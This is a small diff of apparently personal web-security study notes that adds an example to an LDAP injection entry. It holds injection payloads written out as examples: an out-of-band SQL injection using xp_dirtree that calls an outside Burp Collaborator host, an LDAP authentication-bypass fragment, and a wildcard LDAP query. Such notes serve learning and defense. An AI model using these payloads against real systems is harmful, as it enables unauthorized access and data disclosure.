@@ -467,7 +467,7 @@ Ex : '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborat
 	. LDAP injection is vulnarablity by which an attacker can influence backend LDAP queries by injecting malicious ldap queries vai user controllable input
 prevention: user input as an LDAP query should be sanitize first.
 impact: authentication bypass (andmin)(&))
-        information disclosure
+        information disclosure  (/ldap-search?user=*)
 
 *OGNL: object navigational graph language
 	 It is expression language for java  used for embedding expressions into web pages.It is used in java sturts 2.
